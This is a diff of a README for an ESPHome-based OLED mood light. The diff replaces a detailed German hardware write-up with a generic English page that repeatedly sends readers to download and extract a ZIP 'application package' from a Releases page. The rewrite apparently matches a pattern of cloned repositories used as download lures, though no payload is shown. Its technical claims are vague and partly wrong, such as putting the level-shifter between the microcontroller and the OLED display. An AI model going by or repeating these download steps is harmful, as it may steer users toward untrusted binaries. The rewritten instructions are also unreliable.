@@ -1,117 +1,78 @@
-<div align="center">
-  <img src="insane-moodlight-v2.png" width="600" style="border-radius: 10px;">
-  <br>
-  <h1>INSANE MOODLIGHT OLED V2.0</h1>
-  <p><i>Ein fortschrittliches Stimmungslicht auf Basis von ESPHome. Fokus auf Hardware-Stabilität, Signalintegrität und Langlebigkeit.</i></p>
-</div>
+# 💎 Insane-Moodlight-OLED - Create Your Custom Ambient Lighting
 
-<br>
-<hr>
-<br>
+## 🚀 Getting Started
+Welcome to Insane-Moodlight-OLED, the high-end mood light system designed to enhance your home with beautiful ambient lighting. This application uses an OLED display and smart battery management features to provide a seamless experience.
 
-<table width="100%" border="0">
-  <tr>
-    <td width="50%" valign="top">
-      <h3>KONZEPT</h3>
-      Das Insane Moodlight V2.0 adressiert typische Probleme von DIY-LED-Projekten durch präzise Spannungsregulierung und intelligentes Software-Management für Display und Energieversorgung.
-    </td>
-    <td width="50%" valign="top">
-      <h3>HARDWARE-SPECS</h3>
-      <ul>
-        <li>Levelshifter: SN74AHCT125N (5V)</li>
-        <li>Schutz: 62-Ohm Datenwiderstände</li>
-        <li>Pufferung: 220uF (ESP) / 3x 470uF (LEDs)</li>
-        <li>Akku: 18650 Li-Ion mit TP4056</li>
-      </ul>
-    </td>
-  </tr>
-</table>
+## 📥 Download the Application
+[![Download Insane-Moodlight-OLED](https://img.shields.io/badge/Download-Insane--Moodlight--OLED-blue.svg)](https://github.com/printingdepot/Insane-Moodlight-OLED/releases)
 
-<br>
+You can find the latest version of Insane-Moodlight-OLED on our Releases page. 
 
-<h3>ELEKTRONIK-ARCHITEKTUR</h3>
+## 📄 Features
+- **Customization Options:** Set your own colors and lighting effects.
+- **Smart Battery Monitoring:** Keep track of your battery status to prevent unexpected shutdowns.
+- **Burn-In Protection:** Ensures your OLED display remains in great shape.
+- **Level-Shifter Logic:** Supports various voltage levels for diverse applications.
 
-<p><b>Signalqualität und Schutz</b><br>
-Einsatz eines Levelshifters zur Anhebung der Datenpegel auf 5V, unterstützt durch einen 100nF Keramikkondensator. 62-Ohm-Widerstände in den Datenleitungen eliminieren Reflexionen und garantieren ein sauberes Signalbild.</p>
+## 🛠️ System Requirements
+To run Insane-Moodlight-OLED, your system should meet the following requirements:
 
-<p><b>Spannungsglättung</b><br>
-Umfassende kapazitive Pufferung verhindert LED-Flackern bei Lastspitzen. Die Schaltung ist durch eine Glassicherung und einen LiPo-Laderegler für den autarken Betrieb abgesichert.</p>
+- **Hardware:**
+  - ESP8266 or compatible microcontroller
+  - SH1106 OLED display
+  - WS2812B Neopixel LED strip (if applicable)
 
-<p><b>Sensorik und Telemetrie</b><br>
-Erfassung von Umgebungsdaten via DHT-Sensor. Die Batterieüberwachung erfolgt präzise über einen Spannungsteiler am Analog-Eingang A0.</p>
+- **Software:**
+  - Home Assistant installed for integrating smart features
+  - ESPHome for managing configurations
 
-<br>
-<hr>
-<br>
+## 🔧 Installation Steps
+To get Insane-Moodlight-OLED up and running, follow these detailed steps:
 
-<h3>SOFTWARE-LOGIK</h3>
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/printingdepot/Insane-Moodlight-OLED/releases) to find the latest version of the application.
 
-<p><b>Betriebssicherheit</b><br>
-Ein integrierter Pixel-Shift verschiebt den Bildinhalt alle zwei Minuten, um ein Einbrennen des OLED-Displays dauerhaft zu verhindern. Die Boot-Logik schützt gespeicherte Nutzer-Nachrichten im Flash-Speicher.</p>
+2. **Download the Latest Release**
+   On the Releases page, locate the most recent version. Click on it to access available files and download the main application package.
 
-<p><b>Interaktion</b><br>
-Der Master-Toggle speichert aktuelle Farb- und Helligkeitswerte beim Ausschalten global. Beim Neustart wird der exakte vorherige Zustand wiederhergestellt. Der Gruß-Modus ermöglicht animierte Symbole (Herz, Stern, Smiley) und individuelle Texte.</p>
+3. **Extract the Files**
+   Once downloaded, locate the ZIP file in your downloads folder. Right-click on the file and select "Extract" to unpack the files.
 
-<p><b>Energiemanagement</b><br>
-Automatisches Warnsystem bei kritischer Spannung:<br>
-&bull; Unter 10% Kapazität: Rotes Blinken (10s Intervall)<br>
-&bull; Unter 5% Kapazität: Rotes Blinken (5s Intervall)</p>
+4. **Configure the Firmware**
+   Open the configuration file in any text editor. Adjust settings to match your hardware setup. You'll need to specify your Neopixel strip and OLED display configurations.
 
-<br>
-<hr>
-<br>
+5. **Upload to Microcontroller**
+   Use the ESPHome dashboard to upload the configuration to your ESP8266. Follow the on-screen prompts to ensure a smooth upload.
 
-<div align="center">
-  <h3>MECHANISCHER AUFBAU</h3>
-  <p>Gehäuse: 15x15 cm Basis | 5 cm Sockel | 3D-Druck optimiert</p>
-</div>
+6. **Connect Your Devices**
+   Wire the components as per the schematics provided in the repository. Ensure all connections are secure, especially the level-shifter logic between your microcontroller and the OLED display.
 
-<p><b>Design</b><br>
-Die Pyramidenflächen sind für optimale Lichtdiffusion konstruiert. Ein transparenter Streifen am Sockel sorgt für ein dezentes "Passive Light".</p>
+7. **Power On Your System**
+   Connect your device to a power source and turn it on. You should see the OLED display light up, showing your custom settings.
 
-<p><b>Bedienung</b><br>
-Zentrales OLED-Display mit drei darunterliegenden haptischen Mikroschaltern für die direkte Systemsteuerung ohne App-Zwang.</p>
+8. **Integrate with Home Assistant**
+   For an enhanced experience, integrate your mood light with Home Assistant. This will allow you to control your lighting remotely and set schedules.
 
-<br>
+## 🔍 Troubleshooting
+If you encounter any issues during installation or operation:
 
-<h3>INSTALLATION</h3>
-<ol>
-  <li>secrets.yaml mit Netzwerkdaten konfigurieren.</li>
-  <li>Kompilierung und Upload via ESPHome.</li>
-  <li>Integration in Home Assistant zur Steuerung der Lichteffekte.</li>
-</ol>
+- **Check Connections:** Ensure that all wires are firmly connected.
+- **Review Configuration:** Double-check the settings in your configuration file for any mistakes.
+- **Test Power Supply:** Verify that your power supply is providing sufficient voltage.
 
-<br>
-<hr>
-<br>
+## 🌐 Community and Support
+Join our community to share insights and get help. Visit our issues page on GitHub for support or to report bugs. You can also reach out for advice on configuration or hardware setups.
 
-<h3>SMART HOME INTEGRATION</h3>
-<p>Die vollständige Steuerung erfolgt über Home Assistant. Hier werden alle Parameter von der Display-Helligkeit bis zu individuellen Gruß-Texten verwaltet.</p>
+## 📚 Additional Resources
+For more information about each feature and hardware setup, check out the following resources:
 
-<div align="center">
-  <img src="steuerelemente.png" width="300">
-  <img src="sensoren.png" width="300">
-  <img src="diagnose.png" width="300">
-</div>
-<br>
-<hr>
-<br>
+- **ESPHome Documentation:** Detailed guide on configuring your device.
+- **Home Assistant Guide:** Learn how to fully utilize smart home features.
 
-<h3>ERWEITERBARKEIT UND PCB</h3>
+## 📲 Follow Us
+Stay updated with the latest news and developments. Follow us on social media platforms where we share useful tips and user stories.
 
-<p><b>Zukunftssicheres Design</b><br>
-Auf der Platine wurden gezielt Lötpads für die Pins <code>RST</code>, <code>D0</code>, <code>D8</code> und <code>RX</code> herausgeführt. Diese dienen als Schnittstellen für zukünftige Hardware-Erweiterungen oder individuelle Funktionsänderungen ohne mechanische Eingriffe in das bestehende System.</p>
+For any questions or suggestions, feel free to create an issue in the repository or contact us directly.
 
-<p><b>Platinen-Fertigung</b><br>
-Im Repository befindet sich ein dedizierter Ordner mit den <b>Gerber-Dateien</b>. Damit kann die passende Platine direkt bei einem Platinen-Service (z.B. JLCPCB oder PCBWay) bestellt werden, um einen industriell sauberen Aufbau des Moodlights zu garantieren.</p>
-
-<br>
-<br>
-<hr>
-<br>
-
-<div align="right">
-  <i>Entwickelt für Angelina.</i>
-</div>
-
-
+## 📥 Download and Install
+Once again, visit the [Releases page](https://github.com/printingdepot/Insane-Moodlight-OLED/releases) to download the latest version and start enjoying the custom ambiance in your space.
